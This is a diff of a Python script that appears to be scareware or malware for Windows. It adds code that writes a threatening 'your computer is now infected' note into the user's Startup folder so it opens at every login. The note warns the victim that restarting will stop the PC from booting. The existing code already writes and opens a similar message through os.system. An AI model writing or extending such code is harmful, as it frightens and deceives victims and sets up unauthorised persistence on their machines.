@@ -7,14 +7,33 @@ class Texto:
         caminho = os.path.join(diretorio, 'texto.txt')
 
         text = r'''
-            Seu computador esta infectado.
-            Lembre-se, foi a sua escolha.
+            Your computer is infected.
+            Remember, it was your own choice.
         '''
 
-        with open(caminho, 'w') as file:
+        with open(caminho, 'w', encoding="utf-8-sig") as file:
             file.write(text)
 
         os.system(f'start ' + caminho)
+
+    def texto_inicial():
+        user = os.getlogin()
+        caminho = os.path.join('C:\\', 'Users', user, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'end.txt')
+
+        comando = r'''
+            Hello again.
+            
+            Yes, you didn't read it wrong, your computer is now infected.
+            
+            >>> DO NOT TRY TO RESTART OR TURN OFF YOUR PC! <<<
+
+            Or your pc won't boot anymore, so i'd recommend you to just enjoy your last moments with your PC.
+
+            And do not forget, it was all your own choice...
+        '''
+
+        with open(caminho, 'w', encoding="utf-8-sig") as file:
+            file.write(comando)
 
 class Tarefa:
 
